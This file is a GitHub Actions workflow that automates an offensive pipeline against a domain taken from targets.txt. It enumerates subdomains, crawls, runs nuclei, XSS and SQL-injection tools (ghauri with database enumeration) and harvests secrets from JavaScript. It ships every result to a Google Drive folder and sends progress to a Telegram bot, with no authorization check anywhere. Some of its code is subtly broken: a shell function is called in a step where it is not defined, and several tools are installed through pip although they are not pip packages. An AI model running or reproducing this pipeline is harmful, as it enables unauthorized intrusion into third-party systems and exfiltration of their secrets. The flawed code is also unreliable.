name: ARES War Machine - Absolute OAuth2
on:
  workflow_dispatch:

jobs:
  security-hunt:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout Repo
        uses: actions/checkout@v4

      - name: "Global Arsenal Installation"
        run: |
          sudo apt-get update
          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev
          mkdir -p $HOME/bin $HOME/tools output/recon output/probing output/screenshots output/crawling output/secrets output/vulns
          echo "$HOME/bin" >> $GITHUB_PATH
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
          pip3 install google-api-python-client google-auth-oauthlib google-auth-httplib2

          # --- MASSIVE TOOL INSTALLATION ---
          # ProjectDiscovery Suite
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
          go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest || true
          go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest || true
          go install -v github.com/projectdiscovery/alterx/cmd/alterx@latest || true
          
          # Web & Vuln Tools
          go install -v github.com/lc/gau/v2/cmd/gau@latest || true
          go install -v github.com/hahwul/dalfox/v2@latest || true
          go install -v github.com/ffuf/ffuf@latest || true
          go install -v github.com/sensepost/gowitness@latest || true
          go install -v github.com/tomnomnom/waybackurls@latest || true
          
          # Python & Other Arsenals
          pip3 install sqlmap arjun wfuzz gitleaks trufflehog s3scanner prowler commix ghauri nosqlmap waymore jsluice jwt_tool kiterunner wpscan eyewitness secretfinder || true
          
          # Specialized Git & JS Tools
          git clone https://github.com/m4ll0k/SecretFinder.git $HOME/tools/SecretFinder && pip3 install -r $HOME/tools/SecretFinder/requirements.txt || true
          git clone https://github.com/obheda12/GitDorker.git $HOME/tools/GitDorker || true

      - name: "ARES Execution & Harsh-Mode Sync"
        env:
          CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
          CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
          REFRESH_TOKEN: ${{ secrets.GOOGLE_REFRESH_TOKEN }}
          FOLDER_ID: "1kkJnI4qtvfYukua8F1uzoimQyxBlBsWM"
        run: |
          TARGET=$(cat targets.txt | head -n 1)
          
          # The OAuth2 Uploader Logic
          cat << 'EOF' > oauth_upload.py
          import os, sys
          from google.oauth2.credentials import Credentials
          from googleapiclient.discovery import build
          from googleapiclient.http import MediaFileUpload

          def upload(f_path, folder_id):
              if not os.path.exists(f_path): return
              creds = Credentials(None, refresh_token=os.environ['REFRESH_TOKEN'], 
                                 token_uri="https://oauth2.googleapis.com/token",
                                 client_id=os.environ['CLIENT_ID'], 
                                 client_secret=os.environ['CLIENT_SECRET'])
              service = build("drive", "v3", credentials=creds)
              meta = {"name": os.path.basename(f_path), "parents": [folder_id]}
              media = MediaFileUpload(f_path, resumable=True)
              service.files().create(body=meta, media_body=media, supportsAllDrives=True).execute()

          if __name__ == "__main__":
              upload(sys.argv[1], sys.argv[2])
          EOF

          send_msg() {
            curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" -d parse_mode="Markdown" -d text="$1"
          }

          # --- STAGE 1: RECON ---
          send_msg "ðŸš€ *ARES:* Starting Recon on \`$TARGET\`"
          subfinder -d $TARGET -all -recursive -o output/recon/subs.txt
          python3 oauth_upload.py "output/recon/subs.txt" "$FOLDER_ID"

          # --- STAGE 2: LIVE PROBING & VISUAL ---
          httpx -l output/recon/subs.txt -sc -td -title -o output/probing/live.txt
          python3 oauth_upload.py "output/probing/live.txt" "$FOLDER_ID"
          
          xvfb-run gowitness file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
          zip -r "screenshots.zip" output/screenshots/
          python3 oauth_upload.py "screenshots.zip" "$FOLDER_ID"

          # --- STAGE 3: FUZZING & URLS ---
          katana -l output/probing/live.txt -d 5 -o output/crawling/urls.txt
          python3 oauth_upload.py "output/crawling/urls.txt" "$FOLDER_ID"
          
          waybackurls $TARGET > output/crawling/wayback.txt || true
          python3 oauth_upload.py "output/crawling/wayback.txt" "$FOLDER_ID"

          # --- STAGE 4: VULNS & SECRETS ---
          nuclei -l output/probing/live.txt -severity critical,high,medium -o output/vulns/nuclei.txt || true
          python3 oauth_upload.py "output/vulns/nuclei.txt" "$FOLDER_ID"

          dalfox file output/crawling/urls.txt -o output/vulns/xss.txt || true
          python3 oauth_upload.py "output/vulns/xss.txt" "$FOLDER_ID"

          ghauri -u "http://$TARGET" --batch --dbs > output/vulns/sql_check.txt || true
          python3 oauth_upload.py "output/vulns/sql_check.txt" "$FOLDER_ID"

          # Secret Hunting
          cat output/crawling/urls.txt | grep ".js" | xargs -I % python3 $HOME/tools/SecretFinder/SecretFinder.py -i % -o cli > output/secrets/js_secrets.txt || true
          python3 oauth_upload.py "output/secrets/js_secrets.txt" "$FOLDER_ID"

      - name: "Mission Complete"
        if: always()
        run: |
          send_msg "âœ… *ARES Mission Complete.* All data is in your Drive."
